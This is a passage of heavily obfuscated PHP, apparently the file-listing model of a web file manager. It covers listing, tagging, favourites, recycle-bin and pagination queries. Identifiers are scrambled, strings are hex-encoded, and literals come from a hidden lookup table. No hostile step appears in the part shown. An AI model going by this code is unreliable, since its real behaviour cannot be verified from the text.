$©Ôô½¬« : array($©Ôô½¬« => $øŸÛ©˜à); foreach ($ò—Î·ßõ as $ı…ª¬öï => $ÒÜ´íúÌ) { if (is_array($ÒÜ´íúÌ)) { $ÒÜ´íúÌ = json_encode_force($ÒÜ´íúÌ); } $this->checkLength($ÒÜ´íúÌ, !1, $this->tableName . $¬Äü†ŸÚ[4] . $©Ôô½¬«); $ÒÜ´íúÌ = self::textEncode($ÒÜ´íúÌ); $ò—Î·ßõ = array($¬Äü†ŸÚ[33] => $İı÷Ú¹Ç, $¬Äü†ŸÚ[94] => $ı…ª¬öï, $¬Äü†ŸÚ[374] => $ÒÜ´íúÌ); $·ø¥É¥¤[] = $this->filterWhere($ò—Î·ßõ); } if (!$·ø¥É¥¤) { return !0; } $íå‡“ëá = $this->cacheKey($¬Äü†ŸÚ[409]); CacheLock::lock($íå‡“ëá); $»¬¯®´ = $this->addAll($·ø¥É¥¤, array(), !0); CacheLock::unlock($íå‡“ëá); return $»¬¯®´; } protected function optionDefault($•£øçß¯ = '') { return !1; } public function setDeep($¿À¿‹¸”, $¡î¶×ª = false, $¤¨“Ññï = '') { $ì˜ñ…– = explode($_SERVER[ïëó©ÒÚ][10], $¿À¿‹¸”); $ÎµÅõ§æ = $this->get(); array_set_value($ÎµÅõ§æ, $¿À¿‹¸”, $¡î¶×ª); $this->set($ì˜ñ…–[0], $ÎµÅõ§æ[$ì˜ñ…–[0]], $¤¨“Ññï); } public function remove($§‹ÅÌ³À, $ûƒ—º—ì = '') { $éùõÕÚ¼ =& $_SERVER[ïëó©ÒÚ]; $this->cacheRemove($ûƒ—º—ì); $÷ÖµÀğÀ = $this->filterWhere(array($éùõÕÚ¼[94] => $§‹ÅÌ³À, $éùõÕÚ¼[33] => $ûƒ—º—ì)); if (is_null($§‹ÅÌ³À)) { unset($÷ÖµÀğÀ[$éùõÕÚ¼[94]]); } return $this->where($÷ÖµÀğÀ)->delete(); } public function cacheSet($Åí¶À…Ë, $ñ­ıÈêë = false) { return Cache::set($this->cacheKey($Åí¶À…Ë), $ñ­ıÈêë); } public function cacheGet($ÆÓèøÈ‡) { return Cache::get($this->cacheKey($ÆÓèøÈ‡)); } public function cacheRemove($İ÷÷ÌÂ) { return Cache::remove($this->cacheKey($İ÷÷ÌÂ)); } protected function filterWhere($•æ”İÍ˜) { return $•æ”İÍ˜; } protected function cacheKey($Òñá©ÎŞ) { return $Òñá©ÎŞ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\143\145"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\x6d\145" => "\x69\157\x5f\x73\x6f\165\x72\143\145\137\x6d\x65\x74\x61", "\x6d\145\x74\x61\x46\x69\145\x6c\x64" => "\x73\x6f\165\162\143\145\111\x44"); protected $dataAuto = array(array("\155\157\144\151\x66\x79\124\151\155\x65", "\164\151\x6d\145", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\x63\164\x69\157\156"), array("\x63\x72\145\141\x74\145\124\151\155\145", "\164\151\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\166\151\x65\167\124\x69\x6d\x65", "\x74\151\155\145", "\151\x6e\x73\x65\162\x74", "\x66\165\x6e\x63\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($à•ì­±Ñ) { return $this->listSource(array($_SERVER[ïëó©ÒÚ][410] => $à•ì­±Ñ)); } public function typeName($â½÷ÎäÎ) { static $Ä‚Â”ùŞ = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\x67\162\x6f\165\x70"); return $Ä‚Â”ùŞ[$â½÷ÎäÎ . $_SERVER[ïëó©ÒÚ][12]]; } public function sourceListInfo($¡Àôà•ş, $ášöè‘€ = false) { $°ÀÎ°í– =& $_SERVER[ïëó©ÒÚ]; $¡Àôà•ş = $¡Àôà•ş ? $¡Àôà•ş : array(); $¡Àôà•ş = array_filter(array_unique($¡Àôà•ş)); if (!$¡Àôà•ş) { return array(); } $¯¦Ô¼—À = $this->where(array($°ÀÎ°í–[411] => array($°ÀÎ°í–[7], $¡Àôà•ş)))->select(); $this->_listDataApply($¯¦Ô¼—À, $ášöè‘€); return array_to_keyvalue($¯¦Ô¼—À, $°ÀÎ°í–[411]); } public function pathInfoFilter(&$çáµöî„) { $¦è‡Û…” =& $_SERVER[ïëó©ÒÚ]; static $ÁÍÈš´Ä = false; static $µÍÎ”© = false; static $œ¦¹ˆí = false; if (!$ÁÍÈš´Ä) { $ö´ç”½å = $¦è‡Û…”[412]; $ö´ç”½å .= $¦è‡Û…”[413]; $ö´ç”½å .= $¦è‡Û…”[414]; $Âß® Ó¨ = $¦è‡Û…”[415]; $Ğ±Ãí×© = explode($¦è‡Û…”[50], $Âß® Ó¨); $ÁÍÈš´Ä = explode($¦è‡Û…”[50], $ö´ç”½å); $µÍÎ”© = array(); foreach ($ÁÍÈš´Ä as $óáßâ×©) { if (in_array($óáßâ×©, $Ğ±Ãí×©)) { continue; } $µÍÎ”©[] = $óáßâ×©; } $œ¦¹ˆí = explode($¦è‡Û…”[50], $¦è‡Û…”[416]); } foreach ($œ¦¹ˆí as $ó¡â…òÅ) { if (isset($çáµöî„[$ó¡â…òÅ])) { $çáµöî„[$ó¡â…òÅ] = intval($çáµöî„[$ó¡â…òÅ]); } } $çáµöî„[$¦è‡Û…”[84]] = $¦è‡Û…”[417] . $çáµöî„[$¦è‡Û…”[411]] . $¦è‡Û…”[418]; $çáµöî„[$¦è‡Û…”[33]] = $çáµöî„[$¦è‡Û…”[419]] == 1 ? $¦è‡Û…”[75] : $¦è‡Û…”[199]; $çáµöî„[$¦è‡Û…”[420]] = $this->typeName($çáµöî„[$¦è‡Û…”[420]]); if ($çáµöî„[$¦è‡Û…”[419]] != 1) { $çáµöî„[$¦è‡Û…”[174]] = $çáµöî„[$¦è‡Û…”[421]]; unset($çáµöî„[$¦è‡Û…”[421]]); } $—£Ğ£¦ = $ÁÍÈš´Ä; if (isset($çáµöî„[$¦è‡Û…”[422]]) && $çáµöî„[$¦è‡Û…”[422]][$¦è‡Û…”[423]] == -1) { $—£Ğ£¦ = $µÍÎ”©; } $çáµöî„ = array_field_key($çáµöî„, $—£Ğ£¦); return $çáµöî„; } public function listUserFav() { $åÙ´¹†… =& $_SERVER[ïëó©ÒÚ]; $½ Ñˆ¦ˆ = Model($åÙ´¹†…[424])->listData(); $µé˜¸¨Å = array_filter_by_field($½ Ñˆ¦ˆ, $åÙ´¹†…[33], $åÙ´¹†…[425]); $µé˜¸¨Å = array_to_keyvalue($µé˜¸¨Å, $åÙ´¹†…[12], $åÙ´¹†…[84]); if ($µé˜¸¨Å) { $æ ›¸« = $this->listSource(array($åÙ´¹†…[426] => array($åÙ´¹†…[427], $µé˜¸¨Å))); } $æ ›¸« = array_to_keyvalue($æ ›¸«[$åÙ´¹†…[369]], $åÙ´¹†…[411]); foreach ($½ Ñˆ¦ˆ as &$Ÿòé‡Ùã) { $Ÿòé‡Ùã = array($åÙ´¹†…[428] => $Ÿòé‡Ùã[$åÙ´¹†…[399]], $åÙ´¹†…[429] => $Ÿòé‡Ùã[$åÙ´¹†…[32]], $åÙ´¹†…[430] => $Ÿòé‡Ùã[$åÙ´¹†…[84]], $åÙ´¹†…[431] => $Ÿòé‡Ùã[$åÙ´¹†…[33]], $åÙ´¹†…[432] => $Ÿòé‡Ùã[$åÙ´¹†…[200]], $åÙ´¹†…[433] => $Ÿòé‡Ùã[$åÙ´¹†…[85]]); if ($Ÿòé‡Ùã[$åÙ´¹†…[33]] == $åÙ´¹†…[425] && $æ ›¸«[$Ÿòé‡Ùã[$åÙ´¹†…[84]]]) { $Ÿòé‡Ùã[$åÙ´¹†…[86]] = $æ ›¸«[$Ÿòé‡Ùã[$åÙ´¹†…[84]]]; } } unset($Ÿòé‡Ùã); return $½ Ñˆ¦ˆ; } public function listUserTag($¸–ÉÑÛ²) { $¢®Í‘½é =& $_SERVER[ïëó©ÒÚ]; if ($¸–ÉÑÛ² && !is_array($¸–ÉÑÛ²)) { $¸–ÉÑÛ² = array($¸–ÉÑÛ²); } $›ŞÄ­ü« = Model($¢®Í‘½é[434])->listData(); $®°¦‡Ï¤ = array(); $©õæ…• = array(); foreach ($›ŞÄ­ü« as $ÔÜ‹Ç) { $Ÿ‘ ¾ = $ÔÜ‹Ç[$¢®Í‘½é[84]]; if (!$Ÿ‘ ¾) { continue; } if (!isset($©õæ…•[$Ÿ‘ ¾])) { $©õæ…•[$Ÿ‘ ¾] = array(); } $©õæ…•[$Ÿ‘ ¾][] = $ÔÜ‹Ç[$¢®Í‘½é[435]]; $®°¦‡Ï¤[$ÔÜ‹Ç[$¢®Í‘½é[84]]] = $ÔÜ‹Ç; } $¸ÕÉËşã = array(); $Ô©„‹¸– = array(); $ûêÙëï = array(); foreach ($©õæ…• as $Ô‘´½ò¼ => $›„É€ÊÑ) { $ü‹ÕÕ„‡ = !0; if (!$¸–ÉÑÛ²) { $¸ÕÉËşã[] = $Ô‘´½ò¼; continue; } foreach ($¸–ÉÑÛ² as $¯ŒÏÅğ) { if (!in_array($¯ŒÏÅğ, $›„É€ÊÑ)) { $ü‹ÕÕ„‡ = !1; break; } } if (!$ü‹ÕÕ„‡) { continue; } if (!is_numeric($Ô‘´½ò¼)) { $µÂ……À¥ = $®°¦‡Ï¤[$Ô‘´½ò¼]; $åî»–ğÚ = array($¢®Í‘½é[32] => $µÂ……À¥[$¢®Í‘½é[32]], $¢®Í‘½é[84] => $µÂ……À¥[$¢®Í‘½é[84]], $¢®Í‘½é[33] => $µÂ……À¥[$¢®Í‘½é[33]], $¢®Í‘½é[86] => array($¢®Í‘½é[436] => 1), $¢®Í‘½é[201] => !0); if ($µÂ……À¥[$¢®Í‘½é[33]] == $¢®Í‘½é[199]) { $ûêÙëï[] = $åî»–ğÚ; } if ($µÂ……À¥[$¢®Í‘½é[33]] == $¢®Í‘½é[75]) { $Ô©„‹¸–[] = $åî»–ğÚ; } continue; } $¸ÕÉËşã[] = $Ô‘´½ò¼; } if ($¸ÕÉËşã) { $•ˆ¨º£Ê = $this->listSource(array($¢®Í‘½é[426] => array($¢®Í‘½é[427], $¸ÕÉËşã))); } $•ˆ¨º£Ê = $•ˆ¨º£Ê ? $•ˆ¨º£Ê : array($¢®Í‘½é[82] => array(), $¢®Í‘½é[83] => array()); $•ˆ¨º£Ê[$¢®Í‘½é[82]] = array_merge($•ˆ¨º£Ê[$¢®Í‘½é[82]], $Ô©„‹¸–); $•ˆ¨º£Ê[$¢®Í‘½é[83]] = array_merge($•ˆ¨º£Ê[$¢®Í‘½é[83]], $ûêÙëï); if (isset($•ˆ¨º£Ê[$¢®Í‘½é[366]]) && count($¸ÕÉËşã) == $•ˆ¨º£Ê[$¢®Í‘½é[366]][$¢®Í‘½é[367]]) { return $•ˆ¨º£Ê; } $é‡ŞËŠ• = array(); $Ş»¾éé´ = array_to_keyvalue($•ˆ¨º£Ê[$¢®Í‘½é[82]], $¢®Í‘½é[12], $¢®Í‘½é[411]); $ÜãÁİš© = array_to_keyvalue($•ˆ¨º£Ê[$¢®Í‘½é[83]], $¢®Í‘½é[12], $¢®Í‘½é[411]); $ÍîÓàÉ¸ = array_merge($ÜãÁİš©, $Ş»¾éé´); foreach ($¸ÕÉËşã as $Ÿ‘ ¾) { if (!in_array($Ÿ‘ ¾, $ÍîÓàÉ¸)) { $é‡ŞËŠ•[] = $Ÿ‘ ¾; } } if ($é‡ŞËŠ•) { Model($¢®Í‘½é[437])->removeBySource($é‡ŞËŠ•); } return $•ˆ¨º£Ê; } public function listUserRecycle() { $İ•î¥ƒ® =& $_SERVER[ïëó©ÒÚ]; $ÜøÎ·¿Í = Model($İ•î¥ƒ®[438])->listData(); if (!$ÜøÎ·¿Í) { return array(); } $õà“…í± = array($İ•î¥ƒ®[426] => array($İ•î¥ƒ®[427], $ÜøÎ·¿Í), $İ•î¥ƒ®[439] => 1); return $this->listSource($õà“…í±); } public function listSource($šˆ¨Á¡, $¨ËÎ¦ª´ = 3000, $¯€İ¼Ç = false) { $ÆášãĞè =& $_SERVER[ïëó©ÒÚ]; if (!isset($šˆ¨Á¡[$ÆášãĞè[440]])) { $šˆ¨Á¡[$ÆášãĞè[440]] = 0; } if (isset($šˆ¨Á¡[$ÆášãĞè[441]]) && $šˆ¨Á¡[$ÆášãĞè[441]] == $ÆášãĞè[197]) { $šˆ¨Á¡[$ÆášãĞè[421]] = array($ÆášãĞè[331], $ÆášãĞè[442]); } $Í‚‹–² = $ÆášãĞè[443]; $´ûİŒ©· = $this->field($Í‚‹–²)->_makeOrder()->where($šˆ¨Á¡)->selectPage($¨ËÎ¦ª´); $this->_listPageCheck($´ûİŒ©·, $Í‚‹–², $šˆ¨Á¡); $this->_listDataApply($´ûİŒ©·[$ÆášãĞè[369]], $¯€İ¼Ç); $this->_listMake($´ûİŒ©·); return $´ûİŒ©·; } private function _listPageCheck(&$œËÃØ­à, $İ†† ­¤, $‹şåñ¸Ú) { $û×³¼§ =& $_SERVER[ïëó©ÒÚ]; if (!is_array($œËÃØ­à[$û×³¼§[366]])) { return; } $ÃÌ¡Œ‡¹ = $œËÃØ­à[$û×³¼§[366]]; if ($ÃÌ¡Œ‡¹[$û×³¼§[368]] <= 1) { return; } if ($ÃÌ¡Œ‡¹[$û×³¼§[367]] >= 100000) { return; } if (Model($û×³¼§[444])->get($û×³¼§[445]) != $û×³¼§[446]) { return; } $İ†† ­¤ = str_replace(array($û×³¼§[53], $û×³¼§[342], $û×³¼§[231]), $û×³¼§[12], $İ†† ­¤); $İ†† ­¤ = $û×³¼§[447] . str_replace($û×³¼§[50], $û×³¼§[448], $İ†† ­¤) . $û×³¼§[449]; $”íàÜŸ’ = $û×³¼§[450]; $”íàÜŸ’ = $”íàÜŸ’ . $û×³¼§[451]; $ÆÀıÀÒ = $ÃÌ¡Œ‡¹[$û×³¼§[363]] * ($ÃÌ¡Œ‡¹[$û×³¼§[353]] - 1) . $û×³¼§[50] . $ÃÌ¡Œ‡¹[$û×³¼§[363]]; $®ßú„¯Ö = $this->_makeOrder(!0); $•·òÕüµ = $û×³¼§[447] . str_replace($û×³¼§[50], $û×³¼§[448], $®ßú„¯Ö[0]); if (strpos($•·òÕüµ, $û×³¼§[452])) { $•·òÕüµ = str_replace($û×³¼§[452], $û×³¼§[453], $•·òÕüµ); } else { $•·òÕüµ .= $û×³¼§[454] . $®ßú„¯Ö[1]; } $èÏ¡£ŒÛ = array(); foreach ($‹şåñ¸Ú as $Û£œúğÈ => $ìÖ©œÒÚ) { $èÏ¡£ŒÛ[$û×³¼§[447] . $Û£œúğÈ] = $ìÖ©œÒÚ; } $this->alias($û×³¼§[455])->field($İ†† ­¤)->limit($ÆÀıÀÒ)->order($•·òÕüµ); $©–µö¸— = $this->join($”íàÜŸ’)->where($èÏ¡£ŒÛ)->select(); if ($©–µö¸—) { $œËÃØ­à[$û×³¼§[369]] = $©–µö¸—; } } protected function _makeOrder($ù‹ƒªİØ = false) { $ò›Óöè¿ =& $_SERVER[ïëó©ÒÚ]; $¬Åë Ô = Model($ò›Óöè¿[456])->get($ò›Óöè¿[457]); $¸ÓŠ“»ğ = Model($ò›Óöè¿[456])->get($ò›Óöè¿[458]); $ÙŸ¢ŠÎê = array($ò›Óöè¿[459] => $ò›Óöè¿[460], $ò›Óöè¿[461] => $ò›Óöè¿[462]); $×üÅçªõ = array($ò›Óöè¿[32] => $ò›Óöè¿[32], $ò›Óöè¿[76] => $ò›Óöè¿[76], $ò›Óöè¿[174] => $ò›Óöè¿[421], $ò›Óöè¿[463] => $ò›Óöè¿[463], $ò›Óöè¿[464] => $ò›Óöè¿[465], $ò›Óöè¿[200] => $ò›Óöè¿[200], $ò›Óöè¿[85] => $ò›Óöè¿[85]); $‡Ëõ½ƒÈ = Input::get($ò›Óöè¿[466], $ò›Óöè¿[7], $¬Åë Ô, array_keys($×üÅçªõ)); $İ¶³üÙå = Input::get($ò›Óöè¿[467], $ò›Óöè¿[7], $¸ÓŠ“»ğ, array_keys($ÙŸ¢ŠÎê)); if (!in_array($‡Ëõ½ƒÈ, array_keys($×üÅçªõ))) { $‡Ëõ½ƒÈ = $ò›Óöè¿[32]; } if (!in_array($İ¶³üÙå, array_keys($ÙŸ¢ŠÎê))) { $‡Ëõ½ƒÈ = $ò›Óöè¿[459]; } if ($‡Ëõ½ƒÈ == $ò›Óöè¿[32]) { } $¯š›“›‡ = $ò›Óöè¿[468] . $×üÅçªõ[$‡Ëõ½ƒÈ] . $ò›Óöè¿[53] . $ÙŸ¢ŠÎê[$İ¶³üÙå]; $¯š›“›‡ = rtrim(trim($¯š›“›‡), $ò›Óöè¿[50]); if ($ù‹ƒªİØ) { return array($¯š›“›‡, $ÙŸ¢ŠÎê[$İ¶³üÙå]); } return $this->order($¯š›“›‡); } protected function _listDataApplyItem($¾âöÄù, $Ù—ºÎ—« = false) { $Öı¡Ä¥ƒ = array($¾âöÄù); $this->_listDataApply($Öı¡Ä¥ƒ, $Ù—ºÎ—«); return $Öı¡Ä¥ƒ[0]; } protected function _listDataApply(&$ç½ı£¨û, $‰¸ó¹³” = false) { $Ã»³’„Ô =& $_SERVER[ïëó©ÒÚ]; if (!$ç½ı£¨û) { $ç½ı£¨û = array(); return; } $¬÷üÌŠ· = array_to_keyvalue($ç½ı£¨û, $Ã»³’„Ô[12], $Ã»³’„Ô[411]); $¬÷üÌŠ· = array_unique($¬÷üÌŠ·); $this->_listSourceCache($ç½ı£¨û); if (!$‰¸ó¹³”) { $this->_listAppendMeta($ç½ı£¨û, $¬÷üÌŠ·); $this->_listAppendFileMeta($ç½ı£¨û, $¬÷üÌŠ·); $this->_listAppendChildren($ç½ı£¨û, $¬÷üÌŠ·); } $this->_listAppendPath($ç½ı£¨û); $this->_listAppendAuth($ç½ı£¨û); $this->_listAppendSourceInfo($ç½ı£¨û, $¬÷üÌŠ·); $this->_listAppendUser($ç½ı£¨û); $this->_listFilterInfo($ç½ı£¨û, $‰¸ó¹³”); $this->_listAppendAuthSecret($ç½ı£¨û); } protected function _listSourceCache($ôöÊıúÒ) { $š„õÎ =& $_SERVER[ïëó©ÒÚ]; foreach ($ôöÊıúÒ as $Ã¾”±óÔ) { self::$cacheSourceInfo[$š„õÎ[469] . $Ã¾”±óÔ[$š„õÎ[411]]] = $Ã¾”±óÔ; } } protected function _listFilterInfo(&$„ÚÍ‡, $Õ­ÜÆõ¹ = false) { $¸ƒù¸´Ÿ =& $_SERVER[ïëó©ÒÚ]; foreach ($„ÚÍ‡ as &$ˆ„ä¦ÒÁ) { $ˆ„ä¦ÒÁ = $this->pathInfoFilter($ˆ„ä¦ÒÁ); self::$cachePathInfo[$¸ƒù¸´Ÿ[470] . intval($Õ­ÜÆõ¹) . $¸ƒù¸´Ÿ[386] . $ˆ„ä¦ÒÁ[$¸ƒù¸´Ÿ[411]]] = $ˆ„ä¦ÒÁ; } unset($ˆ„ä¦ÒÁ); } protected function _listMake(&$«±ûĞàß) { $ÉÅ¶›ßİ =& $_SERVER[ïëó©ÒÚ]; $«±ûĞàß[$ÉÅ¶›ßİ[82]] = array(); $«±ûĞàß[$ÉÅ¶›ßİ[83]] = array(); foreach ($«±ûĞàß[$ÉÅ¶›ßİ[369]] as $¹Ç´É›¤) { $Ô×±‘£¹ = $¹Ç´É›¤[$ÉÅ¶›ßİ[419]] == 1 ? $ÉÅ¶›ßİ[82] : $ÉÅ¶›ßİ[83]; $«±ûĞàß[$Ô×±‘£¹][] = $¹Ç´É›¤; } unset($«±ûĞàß[$ÉÅ¶›ßİ[369]]); } protected function _listAppendMeta(&$®©›Ÿ„Í, $Ñê‘ˆÙ) { $Ş–Ï±Ä =& $_SERVER[ïëó©ÒÚ]; $¸ï»Ù™ç = array($Ş–Ï±Ä[426] => array($Ş–Ï±Ä[427], $Ñê‘ˆÙ)); $ß¸‰È = Model($Ş–Ï±Ä[471])->field($Ş–Ï±Ä[472])->where($¸ï»Ù™ç)->select(); if (!$ß¸‰È) { return; } $¿°£´™Ê = array($Ş–Ï±Ä[473], $Ş–Ï±Ä[474], $Ş–Ï±Ä[453]); $ç‘ö”æë = array(); foreach ($ß¸‰È as $¨¾ê »À) { if (!isset($ç‘ö”æë[$¨¾ê »À[$Ş–Ï±Ä[411]]])) { $ç‘ö”æë[$¨¾ê »À[$Ş–Ï±Ä[411]]] = array(); } if (in_array($¨¾ê »À[$Ş–Ï±Ä[94]], $¿°£´™Ê)) { continue; } $ç‘ö”æë[$¨¾ê »À[$Ş–Ï±Ä[411]]][$¨¾ê »À[$Ş–Ï±Ä[94]]] = $¨¾ê »À[$Ş–Ï±Ä[374]]; } foreach ($®©›Ÿ„Í as &$‡À·ª£) { $‡À·ª£[$Ş–Ï±Ä[475]] = !1; if (isset($ç‘ö”æë[$‡À·ª£[$Ş–Ï±Ä[411]]])) { $‡À·ª£[$Ş–Ï±Ä[475]] = $ç‘ö”æë[$‡À·ª£[$Ş–Ï±Ä[411]]]; } if ($this->fileIsLock($‡À·ª£) && $‡À·ª£[$Ş–Ï±Ä[422]]) { $ß±ƒ†°¡ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‡À·ª£[$Ş–Ï±Ä[422]][$Ş–Ï±Ä[423]] = AuthModel::authDisable($‡À·ª£[$Ş–Ï±Ä[422]][$Ş–Ï±Ä[423]], $ß±ƒ†°¡); $‡À·ª£[$Ş–Ï±Ä[422]][$Ş–Ï±Ä[476]][$Ş–Ï±Ä[422]] = $‡À·ª£[$Ş–Ï±Ä[422]][$Ş–Ï±Ä[423]]; } } unset($‡À·ª£); } protected function _listAppendFileMeta(&$ñôã¬Ñè, $‚³„Ñ€) { $œüÌñ¦ =& $_SERVER[ïëó©ÒÚ]; $©†ı§ï´ = array_to_keyvalue($ñôã¬Ñè, $œüÌñ¦[12], $œüÌñ¦[477]); $©†ı§ï´ = array_filter(array_unique($©†ı§ï´)); if (!$©†ı§ï´) { return; } $›ñô½Æä = array($œüÌñ¦[478] => array($œüÌñ¦[427], $©†ı§ï´)); $È©‰şŠò = $œüÌñ¦[479]; $ôÒª‚Úô = Model($œüÌñ¦[480])->field($È©‰şŠò)->where($›ñô½Æä)->select(); $ôÒª‚Úô = array_to_keyvalue($ôÒª‚Úô, $œüÌñ¦[477]); $»Ø¥Éù½ = Model($œüÌñ¦[481])->field($œüÌñ¦[482])->where($›ñô½Æä)->select(); $»Ø¥Éù½ = $»Ø¥Éù½ ? $»Ø¥Éù½ : array(); $¦œ™ÈÄñ = array(); foreach ($»Ø¥Éù½ as $ÌƒÚËÓÇ) { if (!isset($¦œ™ÈÄñ[$ÌƒÚËÓÇ[$œüÌñ¦[477]]])) { $¦œ™ÈÄñ[$ÌƒÚËÓÇ[$œüÌñ¦[477]]] = array(); } $¦œ™ÈÄñ[$ÌƒÚËÓÇ[$œüÌñ¦[477]]][$ÌƒÚËÓÇ[$œüÌñ¦[94]]] = $ÌƒÚËÓÇ[$œüÌñ¦[374]]; } foreach ($ñôã¬Ñè as &$´šÌ‹ä) { $ó„…óÄä = $´šÌ‹ä[$œüÌñ¦[477]]; if (!$ó„…óÄä || !is_array($ôÒª‚Úô[$ó„…óÄä])) { continue; } $¹ÔêÀ‘´ = $ôÒª‚Úô[$ó„…óÄä]; $¹ÔêÀ‘´[$œüÌñ¦[76]] = $´šÌ‹ä[$œüÌñ¦[76]]; $¹ÔêÀ‘´[$œüÌñ¦[32]] = $´šÌ‹ä[$œüÌñ¦[32]]; if (!isset(self::$cacheFileInfo[$œüÌñ¦[483] . $ó„…óÄä])) { self::$cacheFileInfo[$œüÌñ¦[483] . $ó„…óÄä] = array_merge(array(), $¹ÔêÀ‘´); } unset($ôÒª‚Úô[$ó„…óÄä][$œüÌñ¦[84]]); $¼—äÓÁ = is_array($¦œ™ÈÄñ[$ó„…óÄä]) ? $¦œ™ÈÄñ[$ó„…óÄä] : array(); $´šÌ‹ä[$œüÌñ¦[170]] = array_merge($¼—äÓÁ, $ôÒª‚Úô[$ó„…óÄä]); if (isset($´šÌ‹ä[$œüÌñ¦[170]][$œüÌñ¦[169]])) { $´šÌ‹ä[$œüÌñ¦[169]] = json_decode($´šÌ‹ä[$œüÌñ¦[170]][$œüÌñ¦[169]], !0); unset($´šÌ‹ä[$œüÌñ¦[170]][$œüÌñ¦[169]]); } } unset($´šÌ‹ä); } protected function _listAppendSourceInfo(&$¦«˜âéß, $’ãòÀÌ) { $Ú¡æÇé“ =& $_SERVER[ïëó©ÒÚ]; if (!defined($Ú¡æÇé“[484])) { return; } $ü½²«ÃÄ = Model($Ú¡æÇé“[485])->listData(); $Õâà‘â = Model($Ú¡æÇé“[434])->listData(); $Õ±Ë«¥ = Model($Ú¡æÇé“[424])->listData(); $Øè©Êëƒ = Model($Ú¡æÇé“[486])->listSimple(); $ÕÛ÷Å†± = array_to_keyvalue($ü½²«ÃÄ, $Ú¡æÇé“[399]); $ÌÖ†õ™ª = array_to_keyvalue_group($Õâà‘â, $Ú¡æÇé“[84], $Ú¡æÇé“[435]); $ˆÖ™ùáô = array_to_keyvalue($Õ±Ë«¥, $Ú¡æÇé“[84]); $õÔ÷åªœ = array_to_keyvalue_group($Øè©Êëƒ, $Ú¡æÇé“[411]); foreach ($¦«˜âéß as &$Î›ÅÀÀ‡) { $Î›ÅÀÀ‡[$Ú¡æÇé“[86]] = array($Ú¡æÇé“[487] => 0, $Ú¡æÇé“[488] => 0, $Ú¡æÇé“[489] => 0); if (isset($ˆÖ™ùáô[$Î›ÅÀÀ‡[$Ú¡æÇé“[411]]])) { $Î›ÅÀÀ‡[$Ú¡æÇé“[86]][$Ú¡æÇé“[490]] = 1; $Î›ÅÀÀ‡[$Ú¡æÇé“[86]][$Ú¡æÇé“[491]] = $ˆÖ™ùáô[$Î›ÅÀÀ‡[$Ú¡æÇé“[411]]][$Ú¡æÇé“[32]]; } if ($ÌÖ†õ™ª && $ÕÛ÷Å†± && isset($ÌÖ†õ™ª[$Î›ÅÀÀ‡[$Ú¡æÇé“[411]]])) { $Î›ÅÀÀ‡[$Ú¡æÇé“[86]][$Ú¡æÇé“[492]] = array(); foreach ($ÌÖ†õ™ª[$Î›ÅÀÀ‡[$Ú¡æÇé“[411]]] as $ş¢‹°—) { $æ Ëïû¦ = $ÕÛ÷Å†±[$ş¢‹°—]; $Î›ÅÀÀ‡[$Ú¡æÇé“[86]][$Ú¡æÇé“[492]][] = array($Ú¡æÇé“[493] => $æ Ëïû¦[$Ú¡æÇé“[399]], $Ú¡æÇé“[429] => $æ Ëïû¦[$Ú¡æÇé“[32]], $Ú¡æÇé“[494] => $æ Ëïû¦[$Ú¡æÇé“[495]]); } } if ($õÔ÷åªœ && isset($õÔ÷åªœ[$Î›ÅÀÀ‡[$Ú¡æÇé“[411]]])) { $Î›ÅÀÀ‡[$Ú¡æÇé“[86]][$Ú¡æÇé“[496]] = array(); foreach ($õÔ÷åªœ[$Î›ÅÀÀ‡[$Ú¡æÇé“[411]]] as $à”•ºü‚) { $Î›ÅÀÀ‡[$Ú¡æÇé“[86]][$Ú¡æÇé“[496]] = array($Ú¡æÇé“[497] => $à”•ºü‚[$Ú¡æÇé“[498]], $Ú¡æÇé“[499] => $à”•ºü‚[$Ú¡æÇé“[500]], $Ú¡æÇé“[501] => $à”•ºü‚[$Ú¡æÇé“[411]], $Ú¡æÇé“[502] => $à”•ºü‚[$Ú¡æÇé“[503]], $Ú¡æÇé“[504] => $à”•ºü‚[$Ú¡æÇé“[505]], $Ú¡æÇé“[506] => $à”•ºü‚[$Ú¡æÇé“[506]], $Ú¡æÇé“[507] => $à”•ºü‚[$Ú¡æÇé“[507]]); } } } unset($Î›ÅÀÀ‡); return $¦«˜âéß; } protected function _listAppendChildren(&$‘ş˜¶î¾, $ğëêèĞ”) { $—¦íùÚª =& $_SERVER[ïëó©ÒÚ]; $”«ÈˆØº = array(); $İ«µ‹„Ç = array($—¦íùÚª[207] => 0, $—¦íùÚª[208] => 0); foreach ($‘ş˜¶î¾ as &$É¢„ÁÁ) { if (!$É¢„ÁÁ[$—¦íùÚª[419]]) { continue; } $”«ÈˆØº[] = $É¢„ÁÁ[$—¦íùÚª[411]]; } unset($É¢„ÁÁ); if (!$”«ÈˆØº) { return; } $ÏÈ…éÍ¢ = array($—¦íùÚª[441] => array($—¦íùÚª[7], $”«ÈˆØº), $—¦íùÚª[440] => 0); $ôš¯ô = array($—¦íùÚª[441], $—¦íùÚª[419], $—¦íùÚª[508] => $—¦íùÚª[509]); $ïÙı¦ü = $this->field($ôš¯ô)->where($ÏÈ…éÍ¢)->group($—¦íùÚª[510])->select(); $ÄşüÈŠŠ = array(); foreach ($ïÙı¦ü as $’¹ñ¸) { $¶Ç³óú© = $’¹ñ¸[$—¦íùÚª[441]]; $ôúşŒŒ = $’¹ñ¸[$—¦íùÚª[419]] == $—¦íùÚª[88] ? $—¦íùÚª[208] : $—¦íùÚª[207]; if (!isset($ÄşüÈŠŠ[$¶Ç³óú©])) { $ÄşüÈŠŠ[$¶Ç³óú©] = array($—¦íùÚª[207] => 0, $—¦íùÚª[208] => 0); } $ÄşüÈŠŠ[$¶Ç³óú©][$ôúşŒŒ] += $’¹ñ¸[$—¦íùÚª[509]]; } foreach ($‘ş˜¶î¾ as &$É¢„ÁÁ) { if (!$É¢„ÁÁ[$—¦íùÚª[419]]) { continue; } $í­¾ê˜¡ = 